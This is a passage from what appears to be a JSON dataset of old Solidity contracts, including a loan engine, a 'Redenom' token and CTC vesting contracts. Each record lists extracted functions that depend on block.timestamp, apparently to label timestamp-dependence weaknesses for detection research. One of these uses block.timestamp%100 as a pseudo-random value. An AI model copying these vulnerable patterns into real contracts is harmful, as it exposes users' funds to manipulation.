destroy(index);\n }\n function transfer(address to, uint256 index) public returns (bool) {\n Loan storage loan = loans[index];\n require(msg.sender == loan.lender || msg.sender == loan.approvedTransfer || operators[loan.lender][msg.sender]);\n require(to != address(0));\n lendersBalance[loan.lender] -= 1;\n lendersBalance[to] += 1;\n Transfer(loan.lender, to, index);\n loan.lender = to;\n loan.approvedTransfer = address(0);\n return true;\n }\n function takeOwnership(uint256 _index) public returns (bool) {\n return transfer(msg.sender, _index);\n }\n function transferFrom(address from, address to, uint256 index) public returns (bool) {\n require(loans[index].lender == from);\n return transfer(to, index);\n }\n function approve(address to, uint256 index) public returns (bool) {\n Loan storage loan = loans[index];\n require(msg.sender == loan.lender);\n loan.approvedTransfer = to;\n Approval(msg.sender, to, index);\n return true;\n }\n function setApprovalForAll(address _operator, bool _approved) public returns (bool) {\n operators[msg.sender][_operator] = _approved;\n ApprovalForAll(msg.sender, _operator, _approved);\n return true;\n }\n function getPendingAmount(uint index) public returns (uint256) {\n addInterest(index);\n return getRawPendingAmount(index);\n }\n function getRawPendingAmount(uint index) public view returns (uint256) {\n Loan memory loan = loans[index];\n return safeSubtract(safeAdd(safeAdd(loan.amount, loan.interest), loan.punitoryInterest), loan.paid);\n }\n function calculateInterest(uint256 timeDelta, uint256 interestRate, uint256 amount) internal pure returns (uint256 realDelta, uint256 interest) {\n if (amount == 0) {\n interest = 0;\n realDelta = timeDelta;\n } else {\n interest = safeMult(safeMult(100000, amount), timeDelta) / interestRate;\n realDelta = safeMult(interest, interestRate) / (amount * 100000);\n }\n }\n function internalAddInterest(Loan storage loan, uint256 timestamp) internal {\n if (timestamp > loan.interestTimestamp) {\n uint256 newInterest = loan.interest;\n uint256 newPunitoryInterest = loan.punitoryInterest;\n uint256 newTimestamp;\n uint256 realDelta;\n uint256 calculatedInterest;\n uint256 deltaTime;\n uint256 pending;\n uint256 endNonPunitory = min(timestamp, loan.dueTime);\n if (endNonPunitory > loan.interestTimestamp) {\n deltaTime = endNonPunitory - loan.interestTimestamp;\n if (loan.paid < loan.amount) {\n pending = loan.amount - loan.paid;\n } else {\n pending = 0;\n }\n (realDelta, calculatedInterest) = calculateInterest(deltaTime, loan.interestRate, pending);\n newInterest = safeAdd(calculatedInterest, newInterest);\n newTimestamp = loan.interestTimestamp + realDelta;\n }\n if (timestamp > loan.dueTime) {\n uint256 startPunitory = max(loan.dueTime, loan.interestTimestamp);\n deltaTime = timestamp - startPunitory;\n uint256 debt = safeAdd(loan.amount, newInterest);\n pending = min(debt, safeSubtract(safeAdd(debt, newPunitoryInterest), loan.paid));\n (realDelta, calculatedInterest) = calculateInterest(deltaTime, loan.interestRatePunitory, pending);\n newPunitoryInterest = safeAdd(newPunitoryInterest, calculatedInterest);\n newTimestamp = startPunitory + realDelta;\n }\n if (newInterest != loan.interest || newPunitoryInterest != loan.punitoryInterest) {\n loan.interestTimestamp = newTimestamp;\n loan.interest = newInterest;\n loan.punitoryInterest = newPunitoryInterest;\n }\n }\n }\n function addInterest(uint index) public returns (bool) {\n Loan storage loan = loans[index];\n require(loan.status == Status.lent);\n internalAddInterest(loan, block.timestamp);\n }\n function pay(uint index, uint256 _amount, address _from, bytes oracleData) public returns (bool) {\n Loan storage loan = loans[index];\n require(loan.status == Status.lent);\n addInterest(index);\n uint256 toPay = min(getPendingAmount(index), _amount);\n PartialPayment(index, msg.sender, _from, toPay);\n loan.paid = safeAdd(loan.paid, toPay);\n if (getRawPendingAmount(index) == 0) {\n TotalPayment(index);\n loan.status = Status.paid;\n lendersBalance[loan.lender] -= 1;\n activeLoans -= 1;\n Transfer(loan.lender, 0x0, index);\n }\n uint256 transferValue = convertRate(loan.oracle, loan.currency, oracleData, toPay);\n require(transferValue > 0 || toPay < _amount);\n lockTokens(rcn, transferValue);\n require(rcn.transferFrom(msg.sender, this, transferValue));\n loan.lenderBalance = safeAdd(transferValue, loan.lenderBalance);\n return true;\n }\n function convertRate(Oracle oracle, bytes32 currency, bytes data, uint256 amount) public returns (uint256) {\n if (oracle == address(0)) {\n return amount;\n } else {\n uint256 rate;\n uint256 decimals;\n (rate, decimals) = oracle.getRate(currency, data);\n require(decimals <= RCN_DECIMALS);\n return (safeMult(safeMult(amount, rate), (10**(RCN_DECIMALS-decimals)))) / PRECISION;\n }\n }\n function withdrawal(uint index, address to, uint256 amount) public returns (bool) {\n Loan storage loan = loans[index];\n require(msg.sender == loan.lender);\n loan.lenderBalance = safeSubtract(loan.lenderBalance, amount);\n require(rcn.transfer(to, amount));\n unlockTokens(rcn, amount);\n return true;\n }\n function withdrawalList(uint256[] memory loanIds, address to) public returns (uint256) {\n uint256 inputId;\n uint256 totalWithdraw = 0;\n for (inputId = 0; inputId < loanIds.length; inputId++) {\n Loan storage loan = loans[loanIds[inputId]];\n if (loan.lender == msg.sender) {\n totalWithdraw += loan.lenderBalance;\n loan.lenderBalance = 0;\n }\n }\n require(rcn.transfer(to, totalWithdraw));\n unlockTokens(rcn, totalWithdraw);\n return totalWithdraw;\n }\n function setDeprecated(bool _deprecated) public onlyOwner {\n deprecated = _deprecated;\n }\n}",
  "extract_feature": [
    "function lend(uint index, bytes oracleData, Cosigner cosigner, bytes cosignerData) public returns (bool) {\nLoan storage loan = loans[index];\nrequire(loan.status == Status.initial);\nrequire(isApproved(index));\nrequire(block.timestamp <= loan.expirationRequest);\nloan.lender = msg.sender;\nloan.dueTime = safeAdd(block.timestamp, loan.duesIn);\nloan.interestTimestamp = block.timestamp;\nloan.status = Status.lent;\nTransfer(0x0, loan.lender, index);\nactiveLoans += 1;\nlendersBalance[loan.lender] += 1;\nif (loan.cancelableAt > 0)\ninternalAddInterest(loan, safeAdd(block.timestamp, loan.cancelableAt));\nuint256 transferValue = convertRate(loan.oracle, loan.currency, oracleData, loan.amount);\nrequire(rcn.transferFrom(msg.sender, loan.borrower, transferValue));\nif (cosigner != address(0)) {\nloan.cosigner = address(uint256(cosigner) + 2);\nrequire(cosigner.requestCosign(this, index, cosignerData, oracleData));\nrequire(loan.cosigner == address(cosigner));\n}\nLent(index, loan.lender, cosigner);\nreturn true;\n}",
    "function cosign(uint index, uint256 cost) external returns (bool) {\nLoan storage loan = loans[index];\nrequire(loan.status == Status.lent && (loan.dueTime - loan.duesIn) == block.timestamp);\nrequire(loan.cosigner != address(0));\nrequire(loan.cosigner == address(uint256(msg.sender) + 2));\nloan.cosigner = msg.sender;\nrequire(rcn.transferFrom(loan.lender, msg.sender, cost));\nreturn true;\n}",
    "function addInterest(uint index) public returns (bool) {\nLoan storage loan = loans[index];\nrequire(loan.status == Status.lent);\ninternalAddInterest(loan, block.timestamp);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f42"
  },
  "filename": "7696.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint a, uint b) internal pure returns (uint c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint a, uint b) internal pure returns (uint c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n function div(uint a, uint b) internal pure returns (uint c) {\n require(b > 0);\n c = a / b;\n }\n}\ncontract ERC20Interface {\n function totalSupply() public view returns (uint);\n function balanceOf(address tokenOwner) public view returns (uint balance);\n function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n address internal admin;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyAdmin {\n require(msg.sender == admin || msg.sender == owner);\n _;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n event AdminChanged(address indexed _from, address indexed _to);\n function Owned() public {\n owner = msg.sender;\n admin = msg.sender;\n }\n function setAdmin(address newAdmin) public onlyOwner{\n emit AdminChanged(admin, newAdmin);\n admin = newAdmin;\n }\n function showAdmin() public view onlyAdmin returns(address _admin){\n _admin = admin;\n return _admin;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n}\ncontract Redenom is ERC20Interface, Owned{\n using SafeMath for uint;\n string public name;\n string public symbol;\n uint private _totalSupply;\n uint public decimals = 8;\n uint public round = 1;\n uint public epoch = 1;\n bool public frozen = false;\n uint[8] private dec = [0,0,0,0,0,0,0,0];\n uint[9] private mul = [1,10,100,1000,10000,100000,1000000,10000000,100000000];\n uint[9] private weight = [uint(0),0,0,0,0,5,10,30,55];\n uint[9] private current_toadd = [uint(0),0,0,0,0,0,0,0,0];\n uint public total_fund;\n uint public epoch_fund;\n uint public team_fund;\n uint public redenom_dao_fund;\n struct Account {\n uint balance;\n uint lastRound;\n uint lastVotedBallotId;\n uint bitmask;\n }\n mapping(address=>Account) accounts;\n mapping(address => mapping(address => uint)) allowed;\n event Redenomination(uint indexed round);\n event Epoch(uint indexed epoch);\n event VotingOn(uint indexed _ballotId);\n event VotingOff(uint indexed winner);\n event Vote(address indexed voter, uint indexed propId, uint voterBalance, uint indexed curentBallotId);\n function Redenom() public {\n symbol = \"NOMT\";\n name = \"Redenom_test\";\n _totalSupply = 0;\n total_fund = 1000000 * 10**decimals;\n epoch_fund = 100000 * 10**decimals;\n total_fund = total_fund.sub(epoch_fund);\n }\n function StartNewEpoch() public onlyAdmin returns(bool succ){\n require(frozen == false);\n require(round == 9);\n require(epoch < 10);\n require(votingActive == false);\n dec = [0,0,0,0,0,0,0,0];\n round = 1;\n epoch++;\n epoch_fund = 100000 * 10**decimals;\n total_fund = total_fund.sub(epoch_fund);\n emit Epoch(epoch);\n return true;\n }\n bool public votingActive = false;\n uint public curentBallotId = 0;\n uint public curentWinner;\n modifier onlyVoter {\n require(votingActive == true);\n require(bitmask_check(msg.sender, 4) == true);\n require(bitmask_check(msg.sender, 1024) == false);\n require((accounts[msg.sender].lastVotedBallotId < curentBallotId));\n _;\n }\n struct Project {\n uint id;\n uint votesWeight;\n bool active;\n }\n Project[] public projects;\n struct Winner {\n uint id;\n uint projId;\n }\n Winner[] public winners;\n function addWinner(uint projId) internal {\n winners.push(Winner({\n id: curentBallotId,\n projId: projId\n }));\n }\n function findWinner(uint _ballotId) public constant returns (uint winner){\n for (uint p = 0; p < winners.length; p++) {\n if (winners[p].id == _ballotId) {\n return winners[p].projId;\n }\n }\n }\n function addProject(uint _id) public onlyAdmin {\n projects.push(Project({\n id: _id,\n votesWeight: 0,\n active: true\n }));\n }\n function swapProject(uint _id) public onlyAdmin {\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id){\n if(projects[p].active == true){\n projects[p].active = false;\n }else{\n projects[p].active = true;\n }\n }\n }\n }\n function projectWeight(uint _id) public constant returns(uint PW){\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id){\n return projects[p].votesWeight;\n }\n }\n }\n function projectActive(uint _id) public constant returns(bool PA){\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id){\n return projects[p].active;\n }\n }\n }\n function vote(uint _id) public onlyVoter returns(bool success){\n require(frozen == false);\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id && projects[p].active == true){\n projects[p].votesWeight += sqrt(accounts[msg.sender].balance);\n accounts[msg.sender].lastVotedBallotId = curentBallotId;\n }\n }\n emit Vote(msg.sender, _id, accounts[msg.sender].balance, curentBallotId);\n return true;\n }\n function winningProject() public constant returns (uint _winningProject){\n uint winningVoteWeight = 0;\n for (uint p = 0; p < projects.length; p++) {\n if (projects[p].votesWeight > winningVoteWeight && projects[p].active == true) {\n winningVoteWeight = projects[p].votesWeight;\n _winningProject = projects[p].id;\n }\n }\n }\n function enableVoting() public onlyAdmin returns(uint ballotId){\n require(votingActive == false);\n require(frozen == false);\n curentBallotId++;\n votingActive = true;\n delete projects;\n emit VotingOn(curentBallotId);\n return curentBallotId;\n }\n function disableVoting() public onlyAdmin returns(uint winner){\n require(votingActive == true);\n require(frozen == false);\n votingActive = false;\n curentWinner = winningProject();\n addWinner(curentWinner);\n emit VotingOff(curentWinner);\n return curentWinner;\n }\n function sqrt(uint x) internal pure returns (uint y) {\n uint z = (x + 1) / 2;\n y = x;\n while (z < y) {\n y = z;\n z = (x / z + z) / 2;\n }\n }\n function pay1(address to) public onlyAdmin returns(bool success){\n require(bitmask_check(to, 4) == false);\n uint new_amount = 100000000;\n payout(to,new_amount);\n bitmask_add(to, 4);\n return true;\n }\n function pay055(address to) public onlyAdmin returns(bool success){\n require(bitmask_check(to, 2) == false);\n uint new_amount = 55566600 + (block.timestamp%100);\n payout(to,new_amount);\n bitmask_add(to, 2);\n return true;\n }\n function pay055loyal(address to) public onlyAdmin returns(bool success){\n require(epoch > 1);\n require(bitmask_check(to, 4) == true);\n uint new_amount = 55566600 + (block.timestamp%100);\n payout(to,new_amount);\n return true;\n }\n function payCustom(address to, uint amount) public onlyOwner returns(bool success){\n payout(to,amount);\n return true;\n }\n function payout(address to, uint amount) private returns (bool success){\n require(to != address(0));\n require(amount>=current_mul());\n require(bitmask_check(to, 1024) == false);\n require(frozen == false);\n updateAccount(to);\n uint fixedAmount = fix_amount(amount);\n renewDec( accounts[to].balance, accounts[to].balance.add(fixedAmount) );\n uint team_part = (fixedAmount/100)*10;\n uint dao_part = (fixedAmount/100)*30;\n uint total = fixedAmount.add(team_part).add(dao_part);\n epoch_fund = epoch_fund.sub(total);\n team_fund = team_fund.add(team_part);\n redenom_dao_fund = redenom_dao_fund.add(dao_part);\n accounts[to].balance = accounts[to].balance.add(fixedAmount);\n _totalSupply = _totalSupply.add(total);\n emit Transfer(address(0), to, fixedAmount);\n return true;\n }\n function withdraw_team_fund(address to, uint amount) public onlyOwner returns(bool success){\n require(amount <= team_fund);\n accounts[to].balance = accounts[to].balance.add(amount);\n team_fund = team_fund.sub(amount);\n return true;\n }\n function withdraw_dao_fund(address to, uint amount) public onlyOwner returns(bool success){\n require(amount <= redenom_dao_fund);\n accounts[to].balance = accounts[to].balance.add(amount);\n redenom_dao_fund = redenom_dao_fund.sub(amount);\n return true;\n }\n function freeze_contract() public onlyOwner returns(bool success){\n require(frozen == false);\n frozen = true;\n return true;\n }\n function unfreeze_contract() public onlyOwner returns(bool success){\n require(frozen == true);\n frozen = false;\n return true;\n }\n function renewDec(uint initSum, uint newSum) internal returns(bool success){\n if(round < 9){\n uint tempInitSum = initSum;\n uint tempNewSum = newSum;\n uint cnt = 1;\n while( (tempNewSum > 0 || tempInitSum > 0) && cnt <= decimals ){\n uint lastInitSum = tempInitSum%10;\n tempInitSum = tempInitSum/10;\n uint lastNewSum = tempNewSum%10;\n tempNewSum = tempNewSum/10;\n if(cnt >= round){\n if(lastNewSum >= lastInitSum){\n dec[decimals-cnt] = dec[decimals-cnt].add(lastNewSum - lastInitSum);\n }else{\n dec[decimals-cnt] = dec[decimals-cnt].sub(lastInitSum - lastNewSum);\n }\n }\n cnt = cnt+1;\n }\n }\n return true;\n }\n function bitmask_add(address user, uint _bit) internal returns(bool success){\n require(bitmask_check(user, _bit) == false);\n accounts[user].bitmask = accounts[user].bitmask.add(_bit);\n return true;\n }\n function bitmask_rm(address user, uint _bit) internal returns(bool success){\n require(bitmask_check(user, _bit) == true);\n accounts[user].bitmask = accounts[user].bitmask.sub(_bit);\n return true;\n }\n function bitmask_check(address user, uint _bit) internal view returns (bool status){\n bool flag;\n accounts[user].bitmask & _bit == 0 ? flag = false : flag = true;\n return flag;\n }\n function ban_user(address user) public onlyAdmin returns(bool success){\n bitmask_add(user, 1024);\n return true;\n }\n function unban_user(address user) public onlyAdmin returns(bool success){\n bitmask_rm(user, 1024);\n return true;\n }\n function is_banned(address user) public view onlyAdmin returns (bool result){\n return bitmask_check(user, 1024);\n }\n function redenominate() public onlyAdmin returns(uint current_round){\n require(frozen == false);\n require(round<9);\n _totalSupply = _totalSupply.sub( team_fund%mul[round] ).sub( redenom_dao_fund%mul[round] ).sub( dec[8-round]*mul[round-1] );\n _totalSupply = ( _totalSupply / mul[round] ) * mul[round];\n team_fund = ( team_fund / mul[round] ) * mul[round];\n redenom_dao_fund = ( redenom_dao_fund / mul[round] ) * mul[round];\n if(round>1){\n uint superold = dec[(8-round)+1];\n epoch_fund = epoch_fund.add(superold * mul[round-2]);\n dec[(8-round)+1] = 0;\n }\n if(round<8){\n uint unclimed = dec[8-round];\n uint total_current = dec[8-1-round];\n if(total_current==0){\n current_toadd = [0,0,0,0,0,0,0,0,0];\n round++;\n return round;\n }\n uint[9] memory numbers =[uint(1),2,3,4,5,6,7,8,9];\n uint[9] memory ke9 =[uint(0),0,0,0,0,0,0,0,0];\n uint[9] memory k2e9 =[uint(0),0,0,0,0,0,0,0,0];\n uint k05summ = 0;\n for (uint k = 0; k < ke9.length; k++) {\n ke9[k] = numbers[k]*1e9/total_current;\n if(k<5) k05summ += ke9[k];\n }\n for (uint k2 = 5; k2 < k2e9.length; k2++) {\n k2e9[k2] = uint(ke9[k2])+uint(k05summ)*uint(weight[k2])/uint(100);\n }\n for (uint n = 5; n < current_toadd.length; n++) {\n current_toadd[n] = k2e9[n]*unclimed/10/1e9;\n }\n }else{\n if(round==8){\n epoch_fund = epoch_fund.add(dec[0] * 10000000);\n dec[0] = 0;\n }\n }\n round++;\n emit Redenomination(round);\n return round;\n }\n function updateAccount(address account) public returns(uint new_balance){\n require(frozen == false);\n require(round<=9);\n require(bitmask_check(account, 1024) == false);\n if(round > accounts[account].lastRound){\n if(round >1 && round <=8){\n uint tempDividedBalance = accounts[account].balance/current_mul();\n uint newFixedBalance = tempDividedBalance*current_mul();\n uint lastActiveDigit = tempDividedBalance%10;\n uint diff = accounts[account].balance - newFixedBalance;\n if(diff > 0){\n accounts[account].balance = newFixedBalance;\n emit Transfer(account, address(0), diff);\n }\n uint toBalance = 0;\n if(lastActiveDigit>0 && current_toadd[lastActiveDigit-1]>0){\n toBalance = current_toadd[lastActiveDigit-1] * current_mul();\n }\n if(toBalance > 0 && toBalance < dec[8-round+1]){\n renewDec( accounts[account].balance, accounts[account].balance.add(toBalance) );\n emit Transfer(address(0), account, toBalance);\n accounts[account].balance = accounts[account].balance.add(toBalance);\n dec[8-round+1] = dec[8-round+1].sub(toBalance);\n _totalSupply = _totalSupply.add(toBalance);\n }\n accounts[account].lastRound = round;\n return accounts[account].balance;\n }else{\n if( round == 9){\n uint newBalance = fix_amount(accounts[account].balance);\n uint _diff = accounts[account].balance.sub(newBalance);\n if(_diff > 0){\n renewDec( accounts[account].balance, newBalance );\n accounts[account].balance = newBalance;\n emit Transfer(account, address(0), _diff);\n }\n accounts[account].lastRound = round;\n return accounts[account].balance;\n }\n }\n }\n }\n function current_mul() internal view returns(uint _current_mul){\n return mul[round-1];\n }\n function fix_amount(uint amount) public view returns(uint fixed_amount){\n return ( amount / current_mul() ) * current_mul();\n }\n function get_rest(uint amount) internal view returns(uint fixed_amount){\n return amount % current_mul();\n }\n function totalSupply() public view returns (uint) {\n return _totalSupply;\n }\n function balanceOf(address tokenOwner) public constant returns (uint balance) {\n return accounts[tokenOwner].balance;\n }\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n require(frozen == false);\n require(to != address(0));\n require(bitmask_check(to, 1024) == false);\n tokens = fix_amount(tokens);\n require(tokens>0);\n updateAccount(to);\n updateAccount(msg.sender);\n uint fromOldBal = accounts[msg.sender].balance;\n uint toOldBal = accounts[to].balance;\n accounts[msg.sender].balance = accounts[msg.sender].balance.sub(tokens);\n accounts[to].balance = accounts[to].balance.add(tokens);\n require(renewDec(fromOldBal, accounts[msg.sender].balance));\n require(renewDec(toOldBal, accounts[to].balance));\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n require(frozen == false);\n require(bitmask_check(msg.sender, 1024) == false);\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n require(frozen == false);\n require(bitmask_check(to, 1024) == false);\n updateAccount(from);\n updateAccount(to);\n uint fromOldBal = accounts[from].balance;\n uint toOldBal = accounts[to].balance;\n accounts[from].balance = accounts[from].balance.sub(tokens);\n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n accounts[to].balance = accounts[to].balance.add(tokens);\n require(renewDec(fromOldBal, accounts[from].balance));\n require(renewDec(toOldBal, accounts[to].balance));\n emit Transfer(from, to, tokens);\n return true;\n }\n function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n require(frozen == false);\n require(bitmask_check(msg.sender, 1024) == false);\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n return true;\n }\n function () public payable {\n revert();\n }\n function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\n require(frozen == false);\n return ERC20Interface(tokenAddress).transfer(owner, tokens);\n }\n}",
  "extract_feature": [
    "function pay055(address to) public onlyAdmin returns(bool success){\nrequire(bitmask_check(to, 2) == false);\nuint new_amount = 55566600 + (block.timestamp%100);\npayout(to,new_amount);\nbitmask_add(to, 2);\nreturn true;\n}",
    "function pay055loyal(address to) public onlyAdmin returns(bool success){\nrequire(epoch > 1);\nrequire(bitmask_check(to, 4) == true);\nuint new_amount = 55566600 + (block.timestamp%100);\npayout(to,new_amount);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f43"
  },
  "filename": "7724.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract CTCLock is Ownable {\n using SafeMath for uint256;\n address public teamWallet;\n address public earlyWallet;\n address public institutionWallet;\n uint256 public teamTimeLock = 1000 days;\n uint256 public earlyTimeLock = 5 * 30 days;\n uint256 public institutionTimeLock = 50 * 30 days;\n uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);\n uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);\n uint256 public teamStageSetting = 34;\n uint256 public earlyStageSetting = 5;\n uint256 public institutionStageSetting = 50;\n ERC20Basic public token;\n uint256 public start;\n uint256 public lockStartTime;\n mapping(address => uint256) public allocations;\n mapping(address => uint256) public stageSettings;\n mapping(address => uint256) public timeLockDurations;\n mapping(address => uint256) public releasedAmounts;\n modifier onlyReserveWallets {\n require(allocations[msg.sender] > 0);\n _;\n }\n function CTCLock(ERC20Basic _token,\n address _teamWallet,\n address _earlyWallet,\n address _institutionWallet,\n uint256 _start,\n uint256 _lockTime)public{\n require(_start > 0);\n require(_lockTime > 0);\n require(_start.add(_lockTime) > 0);\n require(_teamWallet != address(0));\n require(_earlyWallet != address(0));\n require(_institutionWallet != address(0));\n token = _token;\n teamWallet = _teamWallet;\n earlyWallet = _earlyWallet;\n institutionWallet = _institutionWallet;\n start = _start;\n lockStartTime = start.add(_lockTime);\n }\n function allocateToken() onlyOwner public{\n require(block.timestamp > lockStartTime);\n require(allocations[teamWallet] == 0);\n require(token.balanceOf(address(this)) == totalAllocation);\n allocations[teamWallet] = teamAllocation;\n allocations[earlyWallet] = earlyAllocation;\n allocations[institutionWallet] = institutionAllocation;\n stageSettings[teamWallet] = teamStageSetting;\n stageSettings[earlyWallet] = earlyStageSetting;\n stageSettings[institutionWallet] = institutionStageSetting;\n timeLockDurations[teamWallet] = teamTimeLock;\n timeLockDurations[earlyWallet] = earlyTimeLock;\n timeLockDurations[institutionWallet] = institutionTimeLock;\n }\n function releaseToken() onlyReserveWallets public{\n uint256 totalUnlocked = unlockAmount();\n require(totalUnlocked <= allocations[msg.sender]);\n require(releasedAmounts[msg.sender] < totalUnlocked);\n uint256 payment = totalUnlocked.sub(releasedAmounts[msg.sender]);\n releasedAmounts[msg.sender] = totalUnlocked;\n require(token.transfer(msg.sender, payment));\n }\n function unlockAmount() public view onlyReserveWallets returns(uint256){\n uint256 stage = vestStage();\n uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);\n return totalUnlocked;\n }\n function vestStage() public view onlyReserveWallets returns(uint256){\n uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\n uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\n if(stage > stageSettings[msg.sender]){\n stage = stageSettings[msg.sender];\n }\n return stage;\n }\n}",
  "extract_feature": [
    "function allocateToken() onlyOwner public{\nrequire(block.timestamp > lockStartTime);\nrequire(allocations[teamWallet] == 0);\nrequire(token.balanceOf(address(this)) == totalAllocation);\nallocations[teamWallet] = teamAllocation;\nallocations[earlyWallet] = earlyAllocation;\nallocations[institutionWallet] = institutionAllocation;\nstageSettings[teamWallet] = teamStageSetting;\nstageSettings[earlyWallet] = earlyStageSetting;\nstageSettings[institutionWallet] = institutionStageSetting;\ntimeLockDurations[teamWallet] = teamTimeLock;\ntimeLockDurations[earlyWallet] = earlyTimeLock;\ntimeLockDurations[institutionWallet] = institutionTimeLock;\n}",
    "function vestStage() public view onlyReserveWallets returns(uint256){\nuint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\nuint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\nif(stage > stageSettings[msg.sender]){\nstage = stageSettings[msg.sender];\n}\nreturn stage;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f44"
  },
  "filename": "7736.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract CTCVesting is Ownable {\n using SafeMath for uint256;\n address public teamWallet;\n address public earlyWallet;\n address public institutionWallet;\n uint256 public teamTimeLock = 1000 days;\n uint256 public earlyTimeLock = 5 * 30 days;\n uint256 public institutionTimeLock = 50 * 30 days;\n uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);\n uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);\n uint256 public teamStageSetting = 34;\n uint256 public earlyStageSetting = 5;\n uint256 public institutionStageSetting = 50;\n ERC20Basic public token;\n uint256 public start;\n uint256 public lockStartTime;\n mapping(address => uint256) public allocations;\n mapping(address => uint256) public stageSettings;\n mapping(address => uint256) public timeLockDurations;\n mapping(address => uint256) public releasedAmounts;\n modifier onlyReserveWallets {\n require(allocations[msg.sender] > 0);\n _;\n }\n function CTCVesting(ERC20Basic _token,\n address _teamWallet,\n address _earlyWallet,\n address _institutionWallet,\n uint256 _start,\n uint256 _lockTime)public{\n require(_start > 0);\n require(_lockTime > 0);\n require(_start.add(_lockTime) > 0);\n require(_teamWallet != address(0));\n require(_earlyWallet != address(0));\n require(_institutionWallet != address(0));\n token = _token;\n teamWallet = _teamWallet;\n earlyWallet = _earlyWallet;\n institutionWallet = _institutionWallet;\n start = _start;\n lockStartTime = start.add(_lockTime);\n }\n function allocateToken() onlyOwner public{\n require(block.timestamp > lockStartTime);\n require(allocations[teamWallet] == 0);\n require(token.balanceOf(address(this)) == totalAllocation);\n allocations[teamWallet] = teamAllocation;\n allocations[earlyWallet] = earlyAllocation;\n allocations[institutionWallet] = 